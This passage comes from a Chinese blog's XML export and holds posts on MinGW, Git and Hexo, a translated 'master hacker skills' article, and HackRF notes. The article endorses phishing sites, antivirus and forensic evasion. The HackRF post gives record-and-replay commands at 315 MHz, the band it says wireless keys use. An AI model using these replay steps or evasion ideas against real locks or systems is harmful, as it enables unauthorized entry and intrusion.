<h2 id="跨平台"><a href="#跨平台" class="headerlink" title="跨平台"></a>跨平台</h2><p>为了在 Windows 中使用 GCC，诞生了 <a href="http://www.mingw.org/"><strong>MinGW</strong></a> 项目，即 Minimalist GNU for Windows（适用于 Windows 的极简 GNU），它是将 GCC 编译器和 GNU Binutils 移植到 Win32 平台下的产物，又被称为 <strong>mingw32</strong>。另有可用于产生 32 位及 64 位 Windows 可执行文件的 <a href="https://mingw-w64.org/doku.php/start"><strong>MinGW-w64</strong></a> 项目，是从原 MinGW 项目产生的分支。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Git小记</title>
    <url>/2018/08/31/git/</url>
    <content><![CDATA[<p><a href="https://git-scm.com/">Git</a>是目前<strong>最流行</strong>的<strong>分布式版本控制系统</strong>（Distributed Version Control System, <strong>DVCS</strong>），类似的工具还有<a href="https://www.mercurial-scm.org/">Mercurial</a>（由<code>hg</code>命令操作）等；在早期，人们常使用<strong>集中式版本控制系统</strong>（Centralized Version Control System，<strong>CVCS</strong>），其典型有<a href="https://www.nongnu.org/cvs/">CVS</a>、<a href="https://subversion.apache.org/">Subversion</a>（SVN）等；现在，越来越多的人开始使用更为优秀的分布式版本控制系统，所谓版本控制，即可以随时记录并切换文件的不同版本。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Git共有3个配置文件，分别是：</p>
<ul>
<li><code>/etc/gitconfig</code>文件用于配置所有用户的配置信息，使用<code>git config --system</code>命令配置</li>
<li>某个用户家目录下的<code>.gitconfig</code>文件只适用于该用户，使用<code>git config --global</code>命令配置</li>
<li>当前Git仓库的<code>.git/config</code>仅针对当前项目，直接使用<code>git config</code>命令进行配置</li>
</ul>
<p>注意：每一个级别会覆盖上一级别的配置，所以<code>.git/config</code>的配置变量会覆盖<code>/etc/gitconfig</code>中的配置变量。<br>按照个人偏好，针对新安装的Git环境，会配置如下信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置提交时使用的用户名和邮箱，必须配置</span></span><br><span class="line">git config --global user.email <span class="string">&quot;you@example.com&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启颜色显示</span></span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置别名</span></span><br><span class="line">git config --global alias.lg1 <span class="string">&quot;log --graph --abbrev-commit --decorate --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --all&quot;</span></span><br><span class="line">git config --global alias.lg2 <span class="string">&quot;log --graph --abbrev-commit --decorate --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n&#x27;&#x27;          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)&#x27; --all&quot;</span></span><br><span class="line">git config --global alias.lg <span class="string">&#x27;!&quot;git lg1&quot;&#x27;</span></span><br><span class="line">git config --global alias.adog <span class="string">&quot;log --all --decorate --oneline --graph&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置difftool为Meld（Windows）</span></span><br><span class="line">git config --global diff.tool meld</span><br><span class="line">git config --global difftool.meld.path <span class="string">&quot;C:\Program Files (x86)\Meld\Meld.exe&quot;</span></span><br><span class="line">git config --global difftool.prompt <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置mergetool为Meld（Windows）</span></span><br><span class="line">git config --global merge.tool meld</span><br><span class="line">git config --global mergetool.meld.path <span class="string">&quot;C:\Program Files (x86)\Meld\Meld.exe&quot;</span></span><br><span class="line">git config --global mergetool.prompt <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>另外，Git默认使用的编辑器是Vim，若要配置成自己喜欢的编辑器(如Emacs)，可使用命令：<code>git config --global core.editor emacs</code>。<br>最后，你可以使用<code>git config --list</code>来查看所有配置信息。</p>
<span id="more"></span>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>要开始对某个项目进行版本控制，需要先在其所在路径下执行<code>git init</code>进行初始化，此命令会在当前路径下创建一个<code>.git</code>的隐藏文件夹，这就是Git仓库目录。<br>Git分为3个区域，Git仓库、工作目录、暂存区域：</p>
<ul>
<li><strong>Git仓库目录</strong>（Repository）是Git用来保存项目的元数据和对象数据库的地方。这是Git中最重要的部分，从其它计算机克隆仓库时，拷贝的就是这里的数据。</li>
<li><strong>工作目录</strong>（Working directory）是对项目的某个版本独立提取出来的内容。这些从Git仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。</li>
<li><strong>暂存区域</strong>（Staging area）是一个文件，保存了下次将提交（commit）的文件列表信息，一般在Git仓库目录中。有时候也被称作“索引”，不过一般说法还是叫暂存区域。</li>
</ul>
<p>基本的Git工作流程如下：</p>
<ol>
<li>在工作目录中修改文件。</li>
<li>暂存文件，将文件的快照放入暂存区域。</li>
<li>提交更新，找到暂存区域的文件，将快照永久性存储到Git仓库目录。</li>
</ol>
<p>根据Git的三个区域，一个文件可以有如下几种状态：</p>
<ul>
<li><strong>未跟踪状态</strong>（untracked）：指新创建且还没有添加到暂存区域的文件</li>
<li><strong>已暂存状态</strong>（staged）：指已经添加到暂存区域的文件</li>
<li><strong>已提交状态</strong>（committed）：指已经从暂存区提交到Git仓库的文件</li>
<li><strong>已修改状态</strong>（modified）：指作了修改但还没有放到暂存区域的文件</li>
</ul>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>每一次提交都是文件的一个版本，可以将这一系列提交看作一条<strong>链表</strong>，链表的头指针（<strong>HEAD</strong>）始终指向最新的提交，即最新的版本。要检出到某一版本，本质上是将HEAD指针指向某一提交。链表中的节点（即提交）都有唯一的父节点和唯一的子节点，Git中<strong>分支</strong>（branch）的本质就是将链表变为<strong>树</strong>。当使用<code>git init</code>初始化Git仓库时，会默认创建<code>master</code>分支，这种一个分支等价于一条链表。<br>使用<code>git branch</code>可列出所有分支，使用<code>git branch dev</code>即可在当前提交点创建新分支<code>dev</code>，接着使用<code>git checkout dev</code>即可切换到<code>dev</code>分支，或者直接使用<code>git checkout -b dev</code>即可一步创建并切换到<code>dev</code>新分支。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul>
<li><code>git version</code>：查看Git版本信息</li>
<li><code>git add test1.txt</code>：将需要被追踪的文件（test1.txt）添加到暂存区域</li>
<li><code>git reset test2.txt</code>：将误被追踪的文件（test2.txt）移除出暂存区域，文件仍会存在于工作目录</li>
<li><code>git commit -m &#39;first commit&#39;</code>：将暂存区域的内容提交到本地仓库，参数<code>-m</code>指定提交时的附带信息，若不带参数<code>-m</code>执行此命令则会自动打开默认的Vim编辑器并要求输入附带信息</li>
<li><code>git push</code>：将本地仓库推送到远程仓库</li>
<li><code>git clone</code>：将远程仓库克隆到本地</li>
<li><code>git pull</code>：将远程仓库的更新拉取到本地仓库</li>
<li><code>git status</code>：查看Git仓库状态</li>
<li><code>git log</code>：查看commit记录，参数<code>--graph</code>可以图形化显示，参数<code>--oneline</code>可以一行显示。</li>
<li><code>git diff</code>：对比工作目录和暂存区域中文件之间的不同</li>
<li><code>git diff --staged</code>：对比暂存区域和Git仓库中最新commit文件之间的不同</li>
<li><code>git diff &lt;first-commit-id&gt; &lt;second-commit-id&gt;</code>：对比Git仓库中两个commit之间的不同，参数为两个commit ID，为方便可以取ID的前7个字符</li>
<li><code>git checkout &lt;commit-id&gt;</code>：切换到某个具体的commit，要切换回最新的commit可使用<code>git checkout master</code></li>
</ul>
<h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p><strong>直接记录快照，而非差异比较</strong>：Git与其他版本控制系统的主要区别在于对待数据的方法，其他的VCS主要记录不同版本之间的差异，而Git则相当于直接记录不同版本的快照。<br><strong>近乎所有操作都是本地执行</strong>：在Git中的绝大多数操作都只需要访问本地文件和资源，一般不需要来自网络上其它计算机的信息。<br><strong>Git保证完整性</strong>：Git中所有数据在存储前都计算校验和(SHA-1)，然后以校验和来引用。这意味着不可能在Git不知情时更改任何文件内容或目录内容。若你在传送过程中丢失信息或损坏文件，Git就能发现。<br><strong>Git一般只添加数据</strong>：你执行的Git操作，几乎只往Git数据库中增加数据。很难让Git执行任何不可逆操作，或者让它以任何方式清除数据。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p>应明确一点，Git是由Linux创始人Linus Torvalds开发的分布式版本控制系统，而GitHub是使用Git实现的代码托管网站，两者并非一类。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>在命令行中直接输入<code>git</code>，可查看相关命令，要具体查看某个命令的帮助信息，可输入<code>git help &lt;command&gt;</code>，如<code>git help diff</code>，要了解更多关于Git的内容，可以参考<a href="https://git-scm.com/book/zh/v2">《Pro Git》</a>一书。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用GitBook编写电子书籍</title>
    <url>/2018/12/16/gitbook/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>成为黑客高手的必备技能</title>
    <url>/2019/02/25/hacker-essential-skills/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/essential-skills-becoming-master-hacker-0154509/">https://null-byte.wonderhowto.com/how-to/essential-skills-becoming-master-hacker-0154509/</a> ，正文如下：</p>
<p>我的许多有抱负的黑客写信给我，都问同样的问题。“我需要什么技能才能成为一个好的黑客？”</p>
<p>由于黑客是最熟练的信息技术学科之一，因此需要广泛的 IT 技术和技术知识。要真正成为一名优秀的黑客，必须掌握许多技能。如果你没有我在此列出的所有技能，请不要气馁，可以将此列表作为你在不久的将来学习和掌握所需内容的起点。</p>
<span id="more"></span>
<p><img src="https://img.wonderhowto.com/img/original/78/70/63533756748235/0/635337567482357870.jpg" alt="image"><br>这是我进入这个精英 IT 行业的万神殿所需技能的概述列表。我将这些技能分为三类，以帮助你从一个级别转到另一个级别，更容易掌握基本技能、中级技能和无形技能，并提供了指向 Null Byte 相关文章的链接，供你了解。</p>
<h2 id="基本技能"><a href="#基本技能" class="headerlink" title="基本技能"></a>基本技能</h2><p>这些是每个黑客在尝试破解之前应该知道的基础知识。一旦掌握了本节中的所有内容，就可以进入中间层。</p>
<h3 id="基本的计算机技能"><a href="#基本的计算机技能" class="headerlink" title="基本的计算机技能"></a>基本的计算机技能</h3><p>不用说，要成为一名黑客，你需要一些基本的计算机技能。这些技能超出了创建 Word 文档或浏览 Internet 的能力。你需要能够在 Windows 中使用命令行，编辑注册表以及设置网络参数。</p>
<p>许多这些基本技能可以在像 A+ 这样的基础计算机技能课程中获得。</p>
<h3 id="网络技能"><a href="#网络技能" class="headerlink" title="网络技能"></a>网络技能</h3><p>你需要了解网络的基础知识，例如以下内容。</p>
<ul>
<li>DHCP</li>
<li>NAT</li>
<li>子网划分</li>
<li>IPv4</li>
<li>IPv6</li>
<li>公有和私有 IP</li>
<li>DNS</li>
<li>路由器和交换机</li>
<li>VLANs</li>
<li>OSI 模型</li>
<li>MAC 寻址</li>
<li>ARP</li>
</ul>
<p>由于我们经常利用这些技术，你越了解它们的工作方式，你就会越成功。请注意，我没有编写下面的两个指南，但它们非常有用，并涵盖了上面提到的一些网络基础知识。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hacker-fundamentals-tale-two-standards-0133727/">黑客基础：两个标准的故事</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hacker-fundamentals-everymans-guide-network-packets-are-routed-across-web-0134491/">一般人的网络数据包路由指南</a></li>
</ul>
<h3 id="Linux-技能"><a href="#Linux-技能" class="headerlink" title="Linux 技能"></a>Linux 技能</h3><p>发展 Linux 技能对于成为黑客是非常关键的。我们用作黑客的几乎所有工具都是为 Linux 开发的，Linux 为我们提供了使用 Windows 时没有的功能。</p>
<p>如果你需要提高你的 Linux 技能，或者你刚开始使用 Linux，请查看下面我的 Linux 初学者系列。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/linux-basics/">针对有抱负的黑客的 Linux 基础知识</a></li>
</ul>
<h3 id="Wireshark-或-Tcpdump"><a href="#Wireshark-或-Tcpdump" class="headerlink" title="Wireshark 或 Tcpdump"></a>Wireshark 或 Tcpdump</h3><p>Wireshark 是使用最广泛的嗅探器/协议分析器，而 tcpdump 是命令行嗅探器/协议分析器。两者在分析 TCP/IP 流量和攻击方面都非常有用。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/spy-your-buddys-network-traffic-intro-wireshark-and-osi-model-0133807/">Wireshark 和 OSI 模型介绍</a></li>
<li><a href="https://null-byte.wonderhowto.com/news/8-wireshark-filters-every-wiretapper-uses-spy-web-conversations-and-surfing-habits-0134508/">Wireshark 过滤器</a></li>
</ul>
<h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><p>你需要熟练使用其中一个虚拟化软件包，如 <a href="https://www.virtualbox.org/">VirtualBox</a> 或 <a href="https://www.vmware.com/products/workstation-pro.html">VMWare Workstation</a>。理想情况下，你需要一个安全的环境来练习你的黑客攻击行为，之后才能将它们带出现实世界。虚拟环境为你提供了一个安全的环境，可以在使用它们之前测试和优化你的黑客攻击。</p>
<h3 id="安全概念与技术"><a href="#安全概念与技术" class="headerlink" title="安全概念与技术"></a>安全概念与技术</h3><p>优秀的黑客了解安全概念和技术。克服安全管理员建立的障碍的唯一方法是熟悉它们。黑客必须了解诸如PKI（公钥基础架构），SSL（安全套接层），IDS（入侵检测系统），防火墙等等。</p>
<p>黑客初学者可以在 Security+ 等基本安全课程中获得许多这些技能。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/snort/">如何读写 Snort 规则来躲避 IDS</a></li>
</ul>
<h3 id="无线技术"><a href="#无线技术" class="headerlink" title="无线技术"></a>无线技术</h3><p>为了能够破解无线，你必须首先了解它的工作原理。诸如加密算法（WEP，WPA，WPA2），四次握手和 WPS 之类的东西。此外，理解诸如连接和认证协议以及无线技术的法律约束等。</p>
<p>要开始学习，请查看以下有关无线术语和技术入门的指南，然后阅读我们的 Wi-Fi 黑客指南集，了解有关各种加密算法的详细信息以及每种黑客如何工作的示例。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-terms-technologies-0147659/">Wi-Fi 术语和技术入门</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/">有抱负的黑客入侵 Wi-Fi 指南</a></li>
</ul>
<h2 id="中级技能"><a href="#中级技能" class="headerlink" title="中级技能"></a>中级技能</h2><p>这是事情变得有趣的地方，你真正开始感受到你作为黑客的能力。知道所有这些将允许你进入更直观的黑客攻击所有镜头 —— 而不是其他一些黑客。</p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>如果没有<a href="https://null-byte.wonderhowto.com/how-to/scripting/">编写脚本的技能</a>，黑客将被降级为使用其他黑客工具。这限制了你的效率。每天都会有一个新工具失效，因为安全管理员提出了防御措施。</p>
<p>要开发自己独特的工具，你需要至少熟练掌握一种脚本语言，包括 BASH shell。这些应该包括 Perl，Python 或 Ruby 之一。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-perl-scripting-for-aspiring-hacker-part-1-0151750/">针对有抱负的黑客的 Perl 脚本</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-1-bash-basics-0149422/">为有抱负的黑客编写脚本，第 1 部分：BASH 基础知识</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-2-conditional-statements-0149695/">为有抱负的黑客编写脚本，第 2 部分：条件语句</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-3-windows-powershell-0151075/">为有抱负的黑客编写脚本，第 3 部分：Windows PowerShell</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/">Metasploit 中 Meterpreter 的黑客脚本终极列表</a></li>
</ul>
<h3 id="数据库技能"><a href="#数据库技能" class="headerlink" title="数据库技能"></a>数据库技能</h3><p>如果你希望能够熟练地<a href="https://null-byte.wonderhowto.com/how-to/db-hacking/">破解数据库</a>，则需要了解数据库及其工作原理。这包括 SQL 语言。我还建议掌握一个主要的 DBMS，如 SQL Server，Oracle 或 MySQL。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-terms-technologies-you-need-know-before-getting-started-0148773/">入门前需要了解的术语和技术</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-hunting-for-microsofts-sql-server-0148993/">寻找微软的 SQL Server</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-cracking-sql-server-passwords-owning-server-0149636/">破解 SQL Server 密码并拥有服务器</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-hacking-mysql-online-databases-with-sqlmap-0150368/">使用 Sqlmap 攻击 MySQL 在线数据库</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-extracting-data-from-online-databases-using-sqlmap-0150688/">使用 Sqlmap 从在线数据库中提取数据</a></li>
</ul>
<h3 id="Web-应用程序"><a href="#Web-应用程序" class="headerlink" title="Web 应用程序"></a>Web 应用程序</h3><p>Web 应用程序可能是近年来黑客最肥沃的土壤。你对Web应用程序如何工作以及它们背后的数据库了解得越多，你就会越成功。此外，你可能需要建立自己的网站以进行网络钓鱼和其他恶意目的。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-clone-any-website-using-httrack-0152420/">如何使用 HTTrack 克隆任何网站</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-spoof-dns-lan-redirect-traffic-your-fake-website-0151620/">如何将流量重定向到假网站</a></li>
</ul>
<h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><p>要成为好黑客，一定不要被抓住！你不能成为一名坐在牢房里 5 年的职业黑客。你对数字取证的了解越多，就越能避免和规避检测。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-1-tools-techniques-0149732/">数字取证，第 1 部分：工具和技术</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-2-network-forensics-0149958/">数字取证，第 2 部分：网络取证</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-3-recovering-deleted-files-0149868/">数字取证，第 3 部分：恢复已删除的文件</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-4-evading-detection-while-dosing-0150445/">数字取证，第 4 部分：DoSing 时的逃避检测</a></li>
</ul>
<h3 id="高级-TCP-IP"><a href="#高级-TCP-IP" class="headerlink" title="高级 TCP/IP"></a>高级 TCP/IP</h3><p>黑客初学者必须了解 TCP/IP 基础知识，但要升级到中级，你必须了解 TCP/IP 协议栈和字段的详细信息。这些包括 TCP 和 IP 数据包中的每个字段（flags，window，df，tos，seq，ack 等）如何被操纵并用于对抗受害者系统以启用中间人攻击等。</p>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>虽然要成为一个好的黑客不需要成为一个密码学家，但是你越了解每种密码算法的优缺点，就越有可能打败它。此外，黑客还可以利用密码学来隐藏他们的活动并逃避检测。</p>
<h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>通过逆向工程，你可以打开一个恶意软件并使用其他功能重新构建它。就像在软件工程中一样，没有人从头开始构建新的应用程序。几乎每个新漏洞或恶意软件都使用其他现有恶意软件中的组件。</p>
<p>此外，逆向工程使黑客能够利用现有漏洞并更改其签名，以便它可以绕过 IDS 和<a href="https://null-byte.wonderhowto.com/how-to/evading-av-software/">防病毒检测</a>。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-change-signature-metasploit-payloads-evade-antivirus-detection-0149867/">如何更改 Metasploit 有效载荷签名以避免防病毒检测</a></li>
</ul>
<h2 id="无形技能"><a href="#无形技能" class="headerlink" title="无形技能"></a>无形技能</h2><p>除了所有这些计算机技能外，成功的黑客还必须具备一些无形技能。这些包括以下内容。</p>
<h3 id="创造性地思考"><a href="#创造性地思考" class="headerlink" title="创造性地思考"></a>创造性地思考</h3><p>黑客攻击系统总是有办法的，而且有很多方法可以实现。一个好的黑客可以创造性地思考同一个黑客的多种方法。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/social-engineering/">Null Byte 的社会工程学指南</a></li>
<li><a href="https://null-byte.wonderhowto.com/forum/cryptolocker-innovative-creative-hack-0151753/">CryptoLocker：一个创新和创造性的黑客</a></li>
</ul>
<h3 id="解决问题的能力"><a href="#解决问题的能力" class="headerlink" title="解决问题的能力"></a>解决问题的能力</h3><p>黑客总是遇到看似无法解决的问题。这就要求黑客习惯于分析性思维和解决问题。这通常要求黑客准确地诊断出问题所在，然后将问题分解为不同的组件。这是伴随着许多小时的练习而来的能力之一。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/forum/problem-solving-is-essential-hacker-skill-0150882/">解决问题是一项必不可少的黑客技能</a></li>
</ul>
<h3 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h3><p>黑客必须坚持不懈。如果你一开始失败了，请再试一次。如果再失败，请提出一种新的方法并重试。只有坚持不懈，你才能破解最安全的系统。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/forum/so-you-want-be-hacker-0148983/">那么......你想成为黑客吗？</a></li>
</ul>
<p>我希望这能给你一些指导，让你了解你需要学习和掌握什么，才能提升到黑客的中级水平。在未来的一篇文章中，我将讨论你需要掌握什么才能提升到高级或大师级的黑客，所以请记着回来，我的新手黑客们！</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>HackRF 初体验</title>
    <url>/2020/01/22/hackrf/</url>
    <content><![CDATA[<p><a href="https://greatscottgadgets.com/hackrf/">HackRF</a> 是由 Great Scott Gadgets 设计和制造的开源 SDR 硬件，其可以发送或接收 1 MHz 到 6 GHz 的无线电信号。目前 HackRF 的具体版本为 HackRF One。你可以通过其<a href="https://greatscottgadgets.com/wheretobuy/">官网上列出的购买网址</a>购买它，也可以在万能的淘宝上购买。<img src="https://greatscottgadgets.com/images/h1-preliminary1-445.jpeg" alt="HackRF One"></p>
<span id="more"></span>

<h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>你需要安装如下软件以使用 HackRF One：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:bladerf/bladerf</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/gnuradio</span><br><span class="line">sudo add-apt-repository -y ppa:gqrx/gqrx-sdr</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install gqrx-sdr hackrf</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hackrf_info    # 查看 Hack RF 连接信息</span><br><span class="line"></span><br><span class="line">hackrf_transfer    # 基于文件进行发送和接收 SDR</span><br><span class="line">hackrf_transfer -h    # 查看 hackrf_transfer 帮助信息</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 录制信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -r：将数据存储到文件中</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -f：中心频率，单位 Hz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -s：采样率，单位 Hz（4/8/10/12.5/16/20 MHz，默认 10 MHz）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -n：采样数量（默认值是无限的）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -a：设置功放（1 表示开启，0 表示关闭）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -g：设置 Rx VGA 增益（0 到 62 dB 之间，每次增加 2 dB）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -l：设置 Rx LNA 增益（0 到 40 dB 之间，每次增加 8 dB）</span></span><br><span class="line">hackrf_transfer -r capture.raw -f 315000000 -l 8/16/24 -g 20/40 [-s 2000000 -n 10000000 -a 1]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重放信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -t：从文件中读取数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -x：设置 Tx VGA 增益（0 到 47 dB 之间，每次增加 1 dB）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -R：重复发送模式（默认为关闭）</span></span><br><span class="line">hackrf_transfer -t capture.raw -f 315000000 -x 40 [-s 2000000 -a 1]</span><br></pre></td></tr></table></figure>

<p>一般无线钥匙工作频段都在 315 Mhz、433.92 Mhz。<br>Tx Mode：发射模式<br>Rx Mode：接收模式</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>针对哈希算法的攻击</title>
    <url>/2018/05/09/hash-attack/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 初体验</title>
    <url>/2017/06/20/hexo-experience/</url>
    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/index.html">Hexo</a> 是一个基于 Node.js 的开源静态博客框架，类似的项目还有基于 Ruby 的 <a href="https://jekyllrb.com/">Jekyll</a>，基于 Go 的 <a href="https://gohugo.io/">Hugo</a>，基于 Python 的 <a href="https://blog.getpelican.com/">Pelican</a> 等等。之所以选择 Hexo，主要是因为它不仅使用人数多，而且有中文文档。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装 Hexo 前，需要安装 <a href="https://nodejs.org/zh-cn/download/">Node.js</a> 和 <a href="https://git-scm.com/downloads">Git</a>，安装 Node.js 的同时，npm（Node Package Manager）也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入 <code>node -v</code> 来测试 Node.js 是否成功安装，输入 <code>npm -v</code> 来测试 npm 是否成功安装。</p>
<p>npm 成功安装后，可使用 <code>npm install -g hexo-cli</code> 来快速安装 Hexo 命令行工具。其次你还需要安装 npm-check-updates 包，它用于以后 Hexo 及其插件的更新。参数 <code>-g</code> 表示全局安装，npm 的包安装分为本地安装（local）和全局安装（global）两种，区别在于：</p>
<p>本地安装：</p>
<ul>
<li>将安装包放在 <code>./node_modules</code> 下（运行 npm 时所在的目录）</li>
<li>可以通过 <code>require()</code> 来引入本地安装的包</li>
</ul>
<p>全局安装：</p>
<ul>
<li>将安装包放在 <code>/usr/local</code> 下</li>
<li>可以直接在命令行里使用<span id="more"></span></li>
</ul>
<p>关于 npm 更多的内容请参考 <a href="http://www.ruanyifeng.com/blog/2016/01/npm-install.html">npm 模块安装机制简介</a>。</p>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>在 <strong>博客所在目录</strong> 执行 <code>hexo version</code> 即可查看 Hexo 版本信息。</p>
<p>要更新 Hexo 及其插件到最新 <strong>主</strong> 版本，需要在 <strong>博客所在目录</strong> 执行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm-check-updates -u</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>若只想更新 Hexo 及其插件到最新 <strong>次</strong> 版本，则只需在 <strong>博客所在目录</strong> 执行 <code>npm update</code> 即可。</p>
<p>要更新 hexo-cli，你只需要再次执行 <code>npm install -g hexo-cli</code> 安装即可。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="新建一个网站"><a href="#新建一个网站" class="headerlink" title="新建一个网站"></a>新建一个网站</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init [folder]</span><br></pre></td></tr></table></figure>

<p>如果没有设置 <code>folder</code>，Hexo 默认在当前的文件夹建立网站。</p>
<h3 id="新建一篇文章"><a href="#新建一篇文章" class="headerlink" title="新建一篇文章"></a>新建一篇文章</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo n [layout] &lt;title&gt;</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>

<p>如果没有设置 <code>layout</code> 的话，默认使用 <code>_config.yml</code> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
